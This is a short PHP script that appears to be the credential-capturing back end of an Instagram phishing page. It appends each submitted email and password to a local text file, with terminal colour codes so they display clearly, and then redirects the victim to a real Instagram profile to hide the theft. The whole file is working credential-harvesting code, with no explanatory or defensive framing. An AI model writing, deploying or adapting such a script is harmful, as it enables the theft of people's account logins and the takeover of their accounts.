<?php

file_put_contents("usernames.txt", "\n\e[1;34m Username: \e[1;36m" . $_POST['email'] . "\n\e[1;34m Pass: \e[1;36m" . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/mike90s15');
exit();
